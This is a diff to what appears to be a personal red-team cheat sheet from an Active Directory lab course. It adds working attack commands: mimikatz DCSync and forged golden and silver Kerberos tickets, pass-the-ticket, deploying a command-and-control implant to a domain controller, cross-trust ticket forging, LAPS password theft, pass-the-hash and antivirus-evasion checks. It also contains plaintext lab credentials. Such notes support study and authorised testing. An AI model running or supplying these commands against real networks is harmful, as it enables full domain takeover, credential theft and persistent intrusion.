@@ -399,17 +399,55 @@ execute -H -c -i -f JuicyPotato.exe -a "-t * -p C:\Temp\msf.exe -l 1337"
 krbtgt NTLM
 mimikatz(powershell) # lsadump::dcsync /user:krbtgt /domain:cyberbotic.io
 
+#Remote Registry Backdoor
+PowerShell Get-RemoteMachineAccountHash -ComputerName dc-1
 
-NTLM practical
+#Golden Tickets
+kerberos::golden /user:<> /domain:<> /sid:<> /krbtgt:<> /ticket:golden.kirbi
+mimikatz # kerberos::golden /user:Administrator /domain:cyberbotic.io /sid:S-1-5-21-3865823697-1816233505-1834004910 /krbtgt:REDACTED /ticket:golden.kirbi
+[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\IEUser\Desktop\golden.kirbi")) 
+Rubeus ptt /ticket:[...snip...]
+Upload \\dc-1\c$\Windows\Temp\GruntService.exe
+Assembly CsExec "dc-1 GruntService GruntService C:\Windows\Temp\GruntService.exe"
+connect dc-1 rastasvc
 
+#Silver Tickets
+kerberos::golden /user:<> /domain:<> /sid:<> /target:<> /service:<> /rc4:<> /ticket:silver.kirbi
+kerberos::golden /user:Administrator /domain:cyberbotic.io /sid:S-1-5-21-3865823697-1816233505-1834004910 /target:dc-1.cyberbotic.io /service:cifs /rc4:REDACTED /ticket:silver.kirbi
 
+#Domain Trusts
+python3 bloodhound.py -u user -p pass -d domain -gc FQDN_DC -c All -ns ip
+proxychains bloodhound-python -c all -u n.glover  -p BenNev\!s  -d cyberbotic.io -ns 10.10.120.1  --dns-tcp     
+proxychains bloodhound-python -c all -u bridgesb  -p Scorpion!  -d dev.zeropointsecurity.co.uk -ns 10.95.108.1 -gc AD02  --dns-tcp   
+proxychains bloodhound-python  -u bridgesb  -p  Scorpion\! -d dev.zeropointsecurity.co.uk -ns 10.95.108.1 -gc ad02.dev.zeropointsecurity.co.uk  --dns-tcp   done
 
+PowerShell Get-DomainTrust -Domain dev.zeropointsecurity.co.uk
+PowerShell Get-DomainComputer -Domain dev.zeropointsecurity.co.uk | select DnsHostName
+Assembly SharpHound3 "-c All -D dev.zeropointsecurity.co.uk"
+Assembly SharpView "Get-DomainUser -SPN -Domain dev.zeropointsecurity.co.uk -Properties SamAccountName"
 
+#Bidirectional Domain Trust
+PowerShell Get-DomainGroup -Identity 'Domain Admins' -Domain zeropointsecurity.co.uk | select ObjectSid
+mimikatz # kerberos::golden /user:<> /domain:<> /sid:<> /sids:<> /krbtgt:<>
+mimikatz # kerberos::golden /user:Administrator /domain:dev.zeropointsecurity.co.uk /sid:S-1-5-21-2824171953-2587308990-2984250211 /sids:S-1-5-21-3063796876-3415205720-618848691-512 /krbtgt:REDACTED /ticket:zps.kirbi
 
+#Azure AD Connect
+ADConnectDump
 
+#Local Administrator Password Solutin
 
+ls \\cyberbotic.io\SysVol\cyberbotic.io\Policies\{FDC369C2-35C2-4D97-B455-BB7839854512}\Machine
+crackmapexec smb 10.10.10.10 -u user -H 8846f7eaee8fb117ad06bdd830b7586c -M laps
+ldapsearch -x -h  -D "@" -w  -b "dc=<>,dc=<>,dc=<>" "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))" ms-MCS-AdmPwd`
+python laps.py -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc01.domain.local
 
+PowerShell Get-DomainComputer -Identity wkstn-1921 -Properties ms-Mcs-AdmPwd
+ms-mcs-admpwd 
+MVYZKwfr356v3M
+MakeToken Administrator . MVYZKwfr356v3M
 
+#Windows Defender Antivirus & AMSI
+ThreatCheck.exe -f C:\Users\Rasta\Downloads\GruntHTTP.exe -e Defender
 
 
 
